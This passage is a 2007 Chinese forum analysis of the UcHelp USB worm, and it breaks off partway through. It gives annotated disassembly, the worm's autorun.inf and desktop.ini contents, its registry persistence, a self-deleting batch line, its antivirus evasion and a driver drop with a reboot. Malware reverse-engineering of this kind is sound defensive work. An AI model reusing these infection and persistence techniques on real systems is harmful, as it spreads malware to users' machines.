

# UcHelp 病毒分析 By Cater

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-166.htm`](https://www.pediy.com/kssd/pediy09/pediy09-166.htm)

> 【文章标题】: UcHelp 病毒分析 By CaTer  
> 【文章作者】: Cater  
> 【作者邮箱】: 24882688@qq.com  
> 【作者 QQ 号】: 24882688  
> 【下载地址】: 自己搜索下载  
> 【加壳方式】: FSG 2.0   
> 【编写语言】: C++ 6.0  
> 【使用工具】: OD  
> 【操作平台】: XP-SP2  
> 【作者声明】: 只是感兴趣，没有其他目的。失误之处敬请诸位大侠赐教!  
> \--------------------------------------------------------------------------------  
> 【详细过程】  
>   UcHelp 病毒分析   
>     
>   旁白：  
>   都大二了，还是无所为，不知道以后工作怎么办哦~苦恼...  
>     
>   烦人事一大堆，最近学校机房病毒泛滥,主要就是 UcHelp 病毒  
>     
>   ///////////////////////////////////////////////////////////  
>     
>   主要就是 移动存储器里面有  
>     
>   ===========================  
>   X:\\RECYCLER\\UcHelp.exe  
>   X:\\RECYCLER\\desktop.ini  
>   X:\\autorun.inf  
>     
>   -----------------------  
>   X:\\autorun.inf   
>       正常情况下不可见  
>   X:\\RECYCLER\\  
>       不能正常访问  
>   -----------------------  
>   ===========================  
>     
>   +++++++++++++++++++++++++++++++++++++++++++++  
>   Explorer 中自动加载  
>   system32\\AceExt32.dll  
>   windows\\Downloaded Program Files\\ZipExt32.dll  
>   +++++++++++++++++++++++++++++++++++++++++++++  
>     
>   当然 ，病毒会感染所有移动存储设备，并加载到系统自动运行，继续传播感染其他及其和移动存储设备。  
>     
>   ///////////////////////////////////////////////////////////  
>     
>   程序没有修改注册表隐藏文件？病毒清理不干净~  
>   so 只好硬着头皮来分析分析这个病毒啦~（还不知道往上面有没有关于这个病毒的分析）  
>     
>     
>     
>   废话这么多，就看看我的分析吧~  
>     
>   Cater \[\*.S.T\] QQ：24882688   
>   2007.06.01 扬州/南京 写  
>     
>   =================================================================================================  
>   第一步 从主程序（UcHelp.exe）开始分析  
>     
>   00401800  /$  55            PUSH EBP  
>   00401801  |.  8BEC          MOV EBP,ESP  
>   00401803  |.  83E4 F8       AND ESP,FFFFFFF8  
>   00401806  |.  81EC 94010000 SUB ESP,194  
>   0040180C  |.  33C0          XOR EAX,EAX  
>   0040180E  |.  894424 09     MOV DWORD PTR SS:\[ESP+9\],EAX  
>   00401812  |.  53            PUSH EBX  
>   00401813  |.  66:894424 11  MOV WORD PTR SS:\[ESP+11\],AX  
>   00401818  |.  56            PUSH ESI  
>   00401819  |.  57            PUSH EDI  
>   0040181A  |.  884424 20     MOV BYTE PTR SS:\[ESP+20\],AL  
>   0040181E  |.  884424 1B     MOV BYTE PTR SS:\[ESP+1B\],AL  
>   00401822  |.  B9 1F000000   MOV ECX,1F  
>   00401827  |.  8D7C24 21     LEA EDI,DWORD PTR SS:\[ESP+21\]  
>   0040182B  |.  F3:AB         REP STOS DWORD PTR ES:\[EDI\]  
>   0040182D  |.  68 80000000   PUSH 80                                  ; /BufSize = 80 (128.)  
>   00401832  |.  8D4C24 24     LEA ECX,DWORD PTR SS:\[ESP+24\]            ; |  
>   00401836  |.  66:AB         STOS WORD PTR ES:\[EDI\]                   ; |  
>   00401838  |.  51            PUSH ECX                                 ; |PathBuffer  
>   00401839  |.  6A 00         PUSH 0                                   ; |hModule = NULL  
>   0040183B  |.  C64424 20 00  MOV BYTE PTR SS:\[ESP+20\],0               ; |  
>   00401840  |.  AA            STOS BYTE PTR ES:\[EDI\]                   ; |  
>   00401841  |.  FF15 7C204000 CALL DWORD PTR DS:\[&lt;&KERNEL32.GetModuleF&gt;; \\GetModuleFileNameA  
>   00401847  |.  E8 E4F8FFFF   CALL UcHelp.00401130                     ;  检查 进程 是否含有 avp.exe  
>   0040184C  |.  84C0          TEST AL,AL  
>   0040184E  |.  74 2E         JE SHORT UcHelp.0040187E  
>   00401850  |.  8B55 08       MOV EDX,DWORD PTR SS:\[EBP+8\]             ;  有 avp.exe 就 来这里拉  
>   00401853  |.  6A 05         PUSH 5                                   ; /ShowState = SW\_SHOW  
>   00401855  |.  6A 00         PUSH 0                                   ; |/lParam = 0  
>   00401857  |.  68 E0174000   PUSH UcHelp.004017E0                     ; ||pDlgProc = UcHelp.004017E0  
>   0040185C  |.  6A 00         PUSH 0                                   ; ||hOwner = NULL  
>   0040185E  |.  6A 65         PUSH 65                                  ; ||pTemplate = 65  
>   00401860  |.  52            PUSH EDX                                 ; ||hInst  
>   00401861  |.  FF15 E4204000 CALL DWORD PTR DS:\[&lt;&USER32.CreateDialog&gt;; |\\CreateDialogParamA  
>   00401867  |.  50            PUSH EAX                                 ; |hWnd  
>   00401868  |.  FF15 E8204000 CALL DWORD PTR DS:\[&lt;&USER32.ShowWindow&gt;\] ; \\ShowWindow  
>   0040186E  |.  E8 2DF9FFFF   CALL UcHelp.004011A0                     ;  释放资源 ret 到 C:\\sysret.dat 并 运行  
>   00401873  |.  68 58020000   PUSH 258                                 ; /Timeout = 600. ms  
>   00401878  |.  FF15 8C204000 CALL DWORD PTR DS:\[&lt;&KERNEL32.Sleep&gt;\]    ; \\Sleep  
>   0040187E  |&gt; \\E8 ADFBFFFF   CALL UcHelp.00401430                     ; 释放资源 dll 到 system32\\AceExt32.dll 并载到 explorer 进程  
>   00401883  |.  8B35 B4204000 MOV ESI,DWORD PTR DS:\[&lt;&MSVCRT.strs&gt;;  msvcrt.strstr  
>   00401889  |.  8D4424 20     LEA EAX,DWORD PTR SS:\[ESP+20\]  
>   0040188D  |.  68 C0234000   PUSH UcHelp.004023C0                ; /UcHelp.exe  
>   00401892  |.  50            PUSH EAX                            ; |s1  
>   00401893  |.  FFD6          CALL ESI                            ; \\strstr  
>   00401895  |.  83C4 08       ADD ESP,8                           ;  检查 当前程序的文件名 中是否含有 UcHelp.exe  
>   00401898  |.  85C0          TEST EAX,EAX  
>   0040189A  |.  75 4B         JNZ SHORT UcHelp.004018E7  
>   0040189C  |.  8D4C24 10     LEA ECX,DWORD PTR SS:\[ESP+10\]       ;  没有 UcHelp.exe 就运行以下  
>   004018A0  |.  51            PUSH ECX                            ; /pHandle  
>   004018A1  |.  68 3F000F00   PUSH 0F003F                         ; |Access = KEY\_ALL\_ACCESS  
>   004018A6  |.  50            PUSH EAX                            ; |Reserved  
>   004018A7  |.  68 78214000   PUSH UcHelp.00402178                ; |SOFTWARE\\Microsoft\\Windows\\CurrentVersion  
>   004018AC  |.  68 02000080   PUSH 80000002                       ; |hKey = HKEY\_LOCAL\_MACHINE  
>   004018B1  |.  FF15 08204000 CALL DWORD PTR DS:\[&lt;&ADVAPI32.RegOp&gt;; \\RegOpenKeyExA  
>   004018B7  |.  68 68214000   PUSH UcHelp.00402168                ; /yes  
>   004018BC  |.  FF15 3C204000 CALL DWORD PTR DS:\[&lt;&KERNEL32.lstrl&gt;; \\lstrlenA  
>   004018C2  |.  8B5424 10     MOV EDX,DWORD PTR SS:\[ESP+10\]  
>   004018C6  |.  50            PUSH EAX                            ; /BufSize  
>   004018C7  |.  68 68214000   PUSH UcHelp.00402168                ; |yes  
>   004018CC  |.  6A 01         PUSH 1                              ; |ValueType = REG\_SZ  
>   004018CE  |.  6A 00         PUSH 0                              ; |Reserved = 0  
>   004018D0  |.  68 6C214000   PUSH UcHelp.0040216C                ; |SM\_GameDrop  
>   004018D5  |.  52            PUSH EDX                            ; |hKey  
>   004018D6  |.  FF15 00204000 CALL DWORD PTR DS:\[&lt;&ADVAPI32.RegSe&gt;; \\RegSetValueExA  
>   004018DC  |.  8B4424 10     MOV EAX,DWORD PTR SS:\[ESP+10\]       ;  写 HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SM\_GameDrop=Yes  
>   004018E0  |.  50            PUSH EAX                            ; /hKey  
>   004018E1  |.  FF15 18204000 CALL DWORD PTR DS:\[&lt;&ADVAPI32.RegCl&gt;; \\RegCloseKey  
>   004018E7  |&gt;  8D4C24 20     LEA ECX,DWORD PTR SS:\[ESP+20\]  
>   004018EB  |.  68 C0234000   PUSH UcHelp.004023C0                ;  UcHelp.exe  
>   004018F0  |.  51            PUSH ECX  
>   004018F1  |.  FFD6          CALL ESI  
>   004018F3  |.  83C4 08       ADD ESP,8  
>   004018F6  |.  85C0          TEST EAX,EAX  
>   004018F8  |.  0F84 70010000 JE UcHelp.00401A6E  
>   004018FE  |.  8B35 EC204000 MOV ESI,DWORD PTR DS:\[&lt;&USER32.wspr&gt;;  USER32.wsprintfA  
>   00401904  |.  8B3D 70204000 MOV EDI,DWORD PTR DS:\[&lt;&KERNEL32.Ge&gt;;  kernel32.GetDriveTypeA  
>   0040190A  |.  B3 43         MOV BL,43  
>   0040190C  |.  8D6424 00     LEA ESP,DWORD PTR SS:\[ESP\]  
>   00401910  |&gt;  0FBEC3        /MOVSX EAX,BL  
>   00401913  |.  50            |PUSH EAX  
>   00401914  |.  33D2          |XOR EDX,EDX  
>   00401916  |.  8D4C24 18     |LEA ECX,DWORD PTR SS:\[ESP+18\]  
>   0040191A  |.  895424 18     |MOV DWORD PTR SS:\[ESP+18\],EDX  
>   0040191E  |.  68 BC234000   |PUSH UcHelp.004023BC               ;  %c:  
>   00401923  |.  51            |PUSH ECX  
>   00401924  |.  895424 24     |MOV DWORD PTR SS:\[ESP+24\],EDX  
>   00401928  |.  FFD6          |CALL ESI  
>   0040192A  |.  83C4 0C       |ADD ESP,0C  
>   0040192D  |.  8D5424 14     |LEA EDX,DWORD PTR SS:\[ESP+14\]  
>   00401931  |.  52            |PUSH EDX  
>   00401932  |.  FFD7          |CALL EDI  
>   00401934  |.  83F8 02       |CMP EAX,2  
>   00401937  |.  74 09         |JE SHORT UcHelp.00401942           ;  找到 移动设备跳出  
>   00401939  |.  FEC3          |INC BL                             ;  列举驱动器，从 c 盘 列举 到 z 盘  
>   0040193B  |.  80FB 5A       |CMP BL,5A  
>   0040193E  |.^ 7E D0         \\JLE SHORT UcHelp.00401910  
>   00401940  |.  EB 7B         JMP SHORT UcHelp.004019BD  
>   00401942  |&gt;  6A 00         PUSH 0                              ; /Title = NULL  
>   00401944  |.  68 AC234000   PUSH UcHelp.004023AC                ; |CabinetWClass  
>   00401949  |.  FF15 F4204000 CALL DWORD PTR DS:\[&lt;&USER32.FindWin&gt;; \\FindWindowA  
>   0040194F  |.  8B35 FC204000 MOV ESI,DWORD PTR DS:\[&lt;&USER32.Find&gt;;  USER32.FindWindowExA  
>   00401955  |.  6A 00         PUSH 0                              ; /Title = NULL  
>   00401957  |.  68 A4234000   PUSH UcHelp.004023A4                ; |WorkerW  
>   0040195C  |.  6A 00         PUSH 0                              ; |hAfterWnd = NULL  
>   0040195E  |.  50            PUSH EAX                            ; |hParent  
>   0040195F  |.  FFD6          CALL ESI                            ; \\FindWindowExA  
>   00401961  |.  6A 00         PUSH 0                              ; /Title = NULL  
>   00401963  |.  68 94234000   PUSH UcHelp.00402394                ; |ReBarWindow32  
>   00401968  |.  6A 00         PUSH 0                              ; |hAfterWnd = NULL  
>   0040196A  |.  50            PUSH EAX                            ; |hParent  
>   0040196B  |.  FFD6          CALL ESI                            ; \\FindWindowExA  
>   0040196D  |.  6A 00         PUSH 0                              ; /Title = NULL  
>   0040196F  |.  68 84234000   PUSH UcHelp.00402384                ; |ComboBoxEx32  
>   00401974  |.  6A 00         PUSH 0                              ; |hAfterWnd = NULL  
>   00401976  |.  50            PUSH EAX                            ; |hParent  
>   00401977  |.  FFD6          CALL ESI                            ; \\FindWindowExA  
>   00401979  |.  6A 00         PUSH 0                              ; /Title = NULL  
>   0040197B  |.  68 78234000   PUSH UcHelp.00402378                ; |ComboBox  
>   00401980  |.  6A 00         PUSH 0                              ; |hAfterWnd = NULL  
>   00401982  |.  50            PUSH EAX                            ; |hParent  
>   00401983  |.  FFD6          CALL ESI                            ; \\FindWindowExA  
>   00401985  |.  6A 00         PUSH 0                              ; /Title = NULL  
>   00401987  |.  68 70234000   PUSH UcHelp.00402370                ; |Edit  
>   0040198C  |.  6A 00         PUSH 0                              ; |hAfterWnd = NULL  
>   0040198E  |.  50            PUSH EAX                            ; |hParent  
>   0040198F  |.  FFD6          CALL ESI                            ; \\FindWindowExA  
>   00401991  |.  8B3D F0204000 MOV EDI,DWORD PTR DS:\[&lt;&USER32.Send&gt;;  USER32.SendMessageA  
>   00401997  |.  8BF0          MOV ESI,EAX  
>   00401999  |.  8D4424 14     LEA EAX,DWORD PTR SS:\[ESP+14\]       ;  下面 是 激活该移动设备的资源管理器窗口  
>   0040199D  |.  50            PUSH EAX                            ; /lParam  
>   0040199E  |.  6A 00         PUSH 0                              ; |wParam = 0  
>   004019A0  |.  6A 0C         PUSH 0C                             ; |Message = WM\_SETTEXT  
>   004019A2  |.  56            PUSH ESI                            ; |hWnd  
>   004019A3  |.  FFD7          CALL EDI                            ; \\SendMessageA  
>   004019A5  |.  6A 00         PUSH 0                              ; /lParam = 0  
>   004019A7  |.  6A 0D         PUSH 0D                             ; |wParam = D  
>   004019A9  |.  68 00010000   PUSH 100                            ; |Message = WM\_KEYDOWN  
>   004019AE  |.  56            PUSH ESI                            ; |hWnd  
>   004019AF  |.  FFD7          CALL EDI                            ; \\SendMessageA  
>   004019B1  |.  6A 00         PUSH 0                              ; /lParam = 0  
>   004019B3  |.  6A 0D         PUSH 0D                             ; |wParam = D  
>   004019B5  |.  68 01010000   PUSH 101                            ; |Message = WM\_KEYUP  
>   004019BA  |.  56            PUSH ESI                            ; |hWnd  
>   004019BB  |.  FFD7          CALL EDI                            ; \\SendMessageA  
>   004019BD  |&gt;  C68424 A00000&gt;MOV BYTE PTR SS:\[ESP+A0\],0          ;  以上代码大致 就是 准备向 移动设备发飙了  
>   004019C5  |.  33C0          XOR EAX,EAX  
>   004019C7  |.  B9 3F000000   MOV ECX,3F  
>   004019CC  |.  8DBC24 A10000&gt;LEA EDI,DWORD PTR SS:\[ESP+A1\]  
>   004019D3  |.  F3:AB         REP STOS DWORD PTR ES:\[EDI\]  
>   004019D5  |.  8D4C24 10     LEA ECX,DWORD PTR SS:\[ESP+10\]  
>   004019D9  |.  51            PUSH ECX                            ; /pHandle  
>   004019DA  |.  66:AB         STOS WORD PTR ES:\[EDI\]              ; |  
>   004019DC  |.  68 30234000   PUSH UcHelp.00402330                ; |Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2  
>   004019E1  |.  68 01000080   PUSH 80000001                       ; |hKey = HKEY\_CURRENT\_USER  
>   004019E6  |.  AA            STOS BYTE PTR ES:\[EDI\]              ; |  
>   004019E7  |.  FF15 10204000 CALL DWORD PTR DS:\[&lt;&ADVAPI32.RegOp&gt;; \\RegOpenKeyA  
>   004019ED  |.  8B1D 14204000 MOV EBX,DWORD PTR DS:\[&lt;&ADVAPI32.Re&gt;;  ADVAPI32.RegEnumKeyA  
>   004019F3  |.  C74424 1C 0A0&gt;MOV DWORD PTR SS:\[ESP+1C\],0A  
>   004019FB  |.  EB 03         JMP SHORT UcHelp.00401A00  
>   004019FD  |   8D49 00       LEA ECX,DWORD PTR DS:\[ECX\]  
>   00401A00  |&gt;  8B4424 10     /MOV EAX,DWORD PTR SS:\[ESP+10\]  
>   00401A04  |.  68 00010000   |PUSH 100  
>   00401A09  |.  8D9424 A40000&gt;|LEA EDX,DWORD PTR SS:\[ESP+A4\]  
>   00401A10  |.  52            |PUSH EDX  
>   00401A11  |.  33F6          |XOR ESI,ESI  
>   00401A13  |.  56            |PUSH ESI  
>   00401A14  |.  50            |PUSH EAX  
>   00401A15  |.  FFD3          |CALL EBX  
>   00401A17  |.  85C0          |TEST EAX,EAX  
>   00401A19  |.  75 42         |JNZ SHORT UcHelp.00401A5D  
>   00401A1B  |.  EB 03         |JMP SHORT UcHelp.00401A20  
>   00401A1D  |   8D49 00       |LEA ECX,DWORD PTR DS:\[ECX\]  
>   00401A20  |&gt;  8B5424 10     |/MOV EDX,DWORD PTR SS:\[ESP+10\]  
>   00401A24  |.  8D8C24 A00000&gt;||LEA ECX,DWORD PTR SS:\[ESP+A0\]  
>   00401A2B  |.  51            ||PUSH ECX                          ; /SubKey  
>   00401A2C  |.  52            ||PUSH EDX                          ; |hKey  
>   00401A2D  |.  FF15 DC204000 ||CALL DWORD PTR DS:\[&lt;&SHLWAPI.SHDe&gt;; \\SHDeleteKeyA  
>   00401A33  |.  33C0          ||XOR EAX,EAX  
>   00401A35  |.  B9 40000000   ||MOV ECX,40  
>   00401A3A  |.  8DBC24 A00000&gt;||LEA EDI,DWORD PTR SS:\[ESP+A0\]  
>   00401A41  |.  F3:AB         ||REP STOS DWORD PTR ES:\[EDI\]  
>   00401A43  |.  8B4C24 10     ||MOV ECX,DWORD PTR SS:\[ESP+10\]  
>   00401A47  |.  68 00010000   ||PUSH 100  
>   00401A4C  |.  8D8424 A40000&gt;||LEA EAX,DWORD PTR SS:\[ESP+A4\]  
>   00401A53  |.  50            ||PUSH EAX  
>   00401A54  |.  46            ||INC ESI  
>   00401A55  |.  56            ||PUSH ESI  
>   00401A56  |.  51            ||PUSH ECX  
>   00401A57  |.  FFD3          ||CALL EBX  
>   00401A59  |.  85C0          ||TEST EAX,EAX  
>   00401A5B  |.^ 74 C3         |\\JE SHORT UcHelp.00401A20  
>   00401A5D  |&gt;  FF4C24 1C     |DEC DWORD PTR SS:\[ESP+1C\]          ;  在 那个项目里面依次删除无关项目  
>   00401A61  |.^ 75 9D         \\JNZ SHORT UcHelp.00401A00  
>   00401A63  |.  E8 B8F7FFFF   CALL UcHelp.00401220                ;  检查 SM\_GameDrop 键值是否为 yes，不是就从释放资源 exe 到 ulinshi32.exe 并运行  
>   00401A68  |.  8B35 B4204000 MOV ESI,DWORD PTR DS:\[&lt;&MSVCRT.strs&gt;;  msvcrt.strstr  
>   00401A6E  |&gt;  E8 0DFCFFFF   CALL UcHelp.00401680                ;  建立 CLSID\\{35CEC8A3-2BE6-11D2-8773-92E220524150}  将 AceExt32.dll 与之关联以及建立项目情况  
>   00401A73  |.  E8 28F9FFFF   CALL UcHelp.004013A0                ;  将本程序 拷贝至 C:\\windows\\Downloaded Program Files\\CxUSBKey.exe  
>   00401A78  |.  8D5424 20     LEA EDX,DWORD PTR SS:\[ESP+20\]  
>   00401A7C  |.  68 C0234000   PUSH UcHelp.004023C0                ;  UcHelp.exe  
>   00401A81  |.  52            PUSH EDX  
>   00401A82  |.  FFD6          CALL ESI  
>   00401A84  |.  83C4 08       ADD ESP,8  
>   00401A87  |.  85C0          TEST EAX,EAX  
>   00401A89  |.  75 05         JNZ SHORT UcHelp.00401A90  
>   00401A8B  |.  E8 70F5FFFF   CALL UcHelp.00401000        ;在临时文件夹 创建 ziptmp.bat 写入，删除本程序的批处理并且运行  
>   00401A90  |&gt;  5F            POP EDI  
>   00401A91  |.  5E            POP ESI  
>   00401A92  |.  33C0          XOR EAX,EAX  
>   00401A94  |.  5B            POP EBX  
>   00401A95  |.  8BE5          MOV ESP,EBP  
>   00401A97  |.  5D            POP EBP  
>   00401A98  \\.  C2 1000       RETN 10  
>     
>   =================================================================================================  
>   第二步：分析 那个针对杀毒软件的 sysret.dat  
>     
>   病毒 主程序 UcHelp.exe 释放资源 ret 的 C:\\sysret.dat   
>     
>   00401600    55              PUSH EBP  
>   00401601    8BEC            MOV EBP,ESP  
>   00401603    83E4 F8         AND ESP,FFFFFFF8  
>   00401606    81EC 08020000   SUB ESP,208  
>   0040160C    56              PUSH ESI  
>   0040160D    57              PUSH EDI  
>   0040160E    E8 DDFEFFFF     CALL UnPacK\_D.004014F0                   ; 释放资源 SYSRET 到 C:\\sysret.sys，并加载到系统核心，并重启电脑  
>   00401613    A1 74114000     MOV EAX,DWORD PTR DS:\[401174\]  
>   00401618    66:8B0D 7811400&gt;MOV CX,WORD PTR DS:\[401178\]  
>   0040161F    894424 10       MOV DWORD PTR SS:\[ESP+10\],EAX  
>   00401623    66:894C24 14    MOV WORD PTR SS:\[ESP+14\],CX  
>   00401628    33C0            XOR EAX,EAX  
>   0040162A    B9 3E000000     MOV ECX,3E  
>   0040162F    8D7C24 16       LEA EDI,DWORD PTR SS:\[ESP+16\]  
>   00401633    F3:AB           REP STOS DWORD PTR ES:\[EDI\]  
>   00401635    68 00010000     PUSH 100  
>   0040163A    8D9424 14010000 LEA EDX,DWORD PTR SS:\[ESP+114\]  
>   00401641    52              PUSH EDX  
>   00401642    6A 00           PUSH 0  
>   00401644    66:AB           STOS WORD PTR ES:\[EDI\]  
>   00401646    66:C74424 14 22&gt;MOV WORD PTR SS:\[ESP+14\],22  
>   0040164D    FF15 40104000   CALL DWORD PTR DS:\[&lt;&KERNEL32.GetModuleF&gt;; kernel32.GetModuleFileNameA  
>   00401653    8B35 3C104000   MOV ESI,DWORD PTR DS:\[&lt;&KERNEL32.lstrcat&gt;; kernel32.lstrcatA  
>   00401659    8D8424 10010000 LEA EAX,DWORD PTR SS:\[ESP+110\]  
>   00401660    50              PUSH EAX  
>   00401661    8D4C24 14       LEA ECX,DWORD PTR SS:\[ESP+14\]  
>   00401665    51              PUSH ECX  
>   00401666    FFD6            CALL ESI  
>   00401668    8D5424 08       LEA EDX,DWORD PTR SS:\[ESP+8\]  
>   0040166C    52              PUSH EDX  
>   0040166D    8D4424 14       LEA EAX,DWORD PTR SS:\[ESP+14\]  
>   00401671    50              PUSH EAX  
>   00401672    FFD6            CALL ESI  
>   00401674    68 68114000     PUSH UnPacK\_D.00401168                   ; ASCII "  
>   del %0"  
>   00401679    8D4C24 14       LEA ECX,DWORD PTR SS:\[ESP+14\]  
>   0040167D    51              PUSH ECX  
>   0040167E    FFD6            CALL ESI  
>   00401680    6A 00           PUSH 0  
>   00401682    6A 00           PUSH 0  
>   00401684    6A 02           PUSH 2  
>   00401686    6A 00           PUSH 0  
>   00401688    6A 00           PUSH 0  
>   0040168A    68 00000040     PUSH 40000000  
>   0040168F    68 5C114000     PUSH UnPacK\_D.0040115C                   ; ASCII "tempds.bat"  
>   00401694    FF15 24104000   CALL DWORD PTR DS:\[&lt;&KERNEL32.CreateFile&gt;; kernel32.CreateFileA  
>   0040169A    8BF0            MOV ESI,EAX  
>   0040169C    8D4424 10       LEA EAX,DWORD PTR SS:\[ESP+10\]  
>   004016A0    8D50 01         LEA EDX,DWORD PTR DS:\[EAX+1\]  
>   004016A3    8A08            MOV CL,BYTE PTR DS:\[EAX\]  
>   004016A5    40              INC EAX  
>   004016A6    84C9            TEST CL,CL  
>   004016A8  ^ 75 F9           JNZ SHORT UnPacK\_D.004016A3  
>   004016AA    2BC2            SUB EAX,EDX  
>   004016AC    6A 00           PUSH 0  
>   004016AE    8D5424 10       LEA EDX,DWORD PTR SS:\[ESP+10\]  
>   004016B2    52              PUSH EDX  
>   004016B3    50              PUSH EAX  
>   004016B4    8D4424 1C       LEA EAX,DWORD PTR SS:\[ESP+1C\]  
>   004016B8    50              PUSH EAX  
>   004016B9    56              PUSH ESI  
>   004016BA    FF15 1C104000   CALL DWORD PTR DS:\[&lt;&KERNEL32.WriteFile&gt;&gt;; kernel32.WriteFile  
>   004016C0    56              PUSH ESI  
>   004016C1    FF15 18104000   CALL DWORD PTR DS:\[&lt;&KERNEL32.CloseHandl&gt;; kernel32.CloseHandle  
>   004016C7    6A 14           PUSH 14  
>   004016C9    FF15 38104000   CALL DWORD PTR DS:\[&lt;&KERNEL32.Sleep&gt;\]    ; kernel32.Sleep  
>   004016CF    6A 00           PUSH 0  
>   004016D1    68 5C114000     PUSH UnPacK\_D.0040115C                   ; ASCII "tempds.bat"  
>   004016D6    FF15 34104000   CALL DWORD PTR DS:\[&lt;&KERNEL32.WinExec&gt;\]  ; kernel32.WinExec  
>   004016DC    5F              POP EDI                                  ; 在 本文件夹下面创建 tempds.bat  
>   004016DD    5E              POP ESI                                  ; 写入 删除本程序的批处理  
>   004016DE    8BE5            MOV ESP,EBP                              ; 运行 tempds.bat 咯  
>   004016E0    5D              POP EBP  
>   004016E1    C2 1000         RETN 10  
>     
>   ============================================  
>     
>   批注一下  
>   004015D5   /74 0D           JE SHORT UnPacK\_D.004015E4  
>   004015D7   |68 80144000     PUSH UnPacK\_D.00401480  
>   004015DC   |E8 CFFEFFFF     CALL UnPacK\_D.004014B0                ;这里就是重启的模块  
>       
>     
>   我想  
>     
>   sysret.sys  
>   里面写着无非是，禁止 avp.exe 运行的相关 R0 代码。   
>     
>   //感谢恶灵骑士 MJ0011 的赐教，原来这里的神秘之处。  
>     
>     
>   =================================================================================================  
>   第三步：分析 病毒核心代码 AceExt32.dll  
>     
>   懒得再去跟 dll 了  
>   大致就是，寻找移动存储设备  
>     
>     
>   ----------------------------------------------  
>   创建文件夹  
>   X:\\RECYCLER\\  
>   ----------------------------------------------  
>     
>     
>     
>   ----------------------------------------------------------  
>   写入文件  
>   X:\\RECYCLER\\UcHelp.exe  
>   X:\\RECYCLER\\desktop.ini  
>   X:\\autorun.inf  
>     
>   内容：  
>     
>   X:\\autorun.inf  
>   ===========================================  
>   \[AutoRun\]  
>   Shell=打开(&O)  
>   shell\\打开(&O)\\command=RECYCLER\\UcHelp.exe  
>   ===========================================  
>     
>     
>   X:\\RECYCLER\\desktop.ini  
>   ===========================================  
>   \[.ShellClassInfo\]  
>   CLSID={645FF040-5081-101B-9F08-00AA002F954E}  
>   ===========================================  
>     
>   --------------------------------------------------------------  
>     
>   做的手脚：  
>     
>   1.  
>   SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad  
>   这里 把 AceExt32.dll 加载到 Explorer.exe 进行中  
>   好像 ZipExt32.dll 也参与其中了  
>     
>   2.  
>   写入  
>   {35CEC8A3-2BE6-11D2-8773-92E220524150}到 CLSD 关联 AceExt32.dll  
>     
>   3.  
>   这个 dll 还具有隐藏，autorun.inf 并限制访问功能  
>     
>   4.  
>   再有的功能就类似 运行 UnHelp.exe 了~  
>     
>   大致 就是 这么个东东了~  
>     
>     
>   =================================================================================================  
>   第四步：分析 ulinshi32.exe 暗部策划向导  
>     
>   00401700  /$  55            PUSH EBP  
>   00401701  |.  8BEC          MOV EBP,ESP  
>   00401703  |.  83E4 F8       AND ESP,FFFFFFF8  
>   00401706  |.  81EC 04020000 SUB ESP,204  
>   0040170C  |.  53            PUSH EBX  
>   0040170D  |.  56            PUSH ESI  
>   0040170E  |.  57            PUSH EDI  
>   0040170F  |.  33C0          XOR EAX,EAX  
>   00401711  |.  C64424 10 00  MOV BYTE PTR SS:\[ESP+10\],0  
>   00401716  |.  8B35 94204000 MOV ESI,DWORD PTR DS:\[&lt;&kernel32.GetWin&gt;;  kernel32.GetWindowsDirectoryA  
>   0040171C  |.  B9 3F000000   MOV ECX,3F  
>   00401721  |.  8D7C24 11     LEA EDI,DWORD PTR SS:\[ESP+11\]  
>   00401725  |.  F3:AB         REP STOS DWORD PTR ES:\[EDI\]  
>   00401727  |.  66:AB         STOS WORD PTR ES:\[EDI\]  
>   00401729  |.  AA            STOS BYTE PTR ES:\[EDI\]  
>   0040172A  |.  33C0          XOR EAX,EAX  
>   0040172C  |.  C68424 100100&gt;MOV BYTE PTR SS:\[ESP+110\],0  
>   00401734  |.  B9 3F000000   MOV ECX,3F  
>   00401739  |.  8DBC24 110100&gt;LEA EDI,DWORD PTR SS:\[ESP+111\]  
>   00401740  |.  F3:AB         REP STOS DWORD PTR ES:\[EDI\]  
>   00401742  |.  66:AB         STOS WORD PTR ES:\[EDI\]  
>   00401744  |.  AA            STOS BYTE PTR ES:\[EDI\]  
>   00401745  |.  68 00010000   PUSH 100                                ; /BufSize = 100 (256.)  
>   0040174A  |.  8D4424 14     LEA EAX,DWORD PTR SS:\[ESP+14\]           ; |  
>   0040174E  |.  50            PUSH EAX                                ; |Buffer  
>   0040174F  |.  FFD6          CALL ESI                                ; \\GetWindowsDirectoryA  
>   00401751  |.  8B3D 34204000 MOV EDI,DWORD PTR DS:\[&lt;&kernel32.lstrca&gt;;  kernel32.lstrcatA  
>   00401757  |.  68 78214000   PUSH UnPack\_D.00402178                  ; /String2 = "\\Downloaded Program Files\\ZipExt32.dll"  
>   0040175C  |.  8D4C24 14     LEA ECX,DWORD PTR SS:\[ESP+14\]           ; |  
>   00401760  |.  51            PUSH ECX                                ; |String1  
>   00401761  |.  FFD7          CALL EDI                                ; \\lstrcat  
>   00401763  |.  68 00010000   PUSH 100                                ; /BufSize = 100 (256.)  
>   00401768  |.  8D9424 140100&gt;LEA EDX,DWORD PTR SS:\[ESP+114\]          ; |  
>   0040176F  |.  52            PUSH EDX                                ; |Buffer  
>   00401770  |.  FFD6          CALL ESI                                ; \\GetWindowsDirectoryA  
>   00401772  |.  68 10234000   PUSH UnPack\_D.00402310                  ; /String2 = "\\Downloaded Program Files\\Ext32.dat"  
>   00401777  |.  8D8424 140100&gt;LEA EAX,DWORD PTR SS:\[ESP+114\]          ; |  
>   0040177E  |.  50            PUSH EAX                                ; |String1  
>   0040177F  |.  FFD7          CALL EDI                                ; \\lstrcat  
>   00401781  |.  8D8C24 100100&gt;LEA ECX,DWORD PTR SS:\[ESP+110\]  
>   00401788  |.  51            PUSH ECX                                ; /FileName  
>   00401789  |.  FF15 68204000 CALL DWORD PTR DS:\[&lt;&kernel32.DeleteFil&gt;; \\DeleteFileA  
>   0040178F  |.  8D9424 100100&gt;LEA EDX,DWORD PTR SS:\[ESP+110\]          ;  删除 C:\\windows\\Downloaded Program Files\\Ext32.dat  
>   00401796  |.  52            PUSH EDX                                ; /NewName  
>   00401797  |.  8D4424 14     LEA EAX,DWORD PTR SS:\[ESP+14\]           ; |C:\\windows\\Downloaded Program Files\\ZipExt32.dll 改名 C:\\windows\\Downloaded Program Files\\Ext32.dll  
>   0040179B  |.  50            PUSH EAX                                ; |ExistingName  
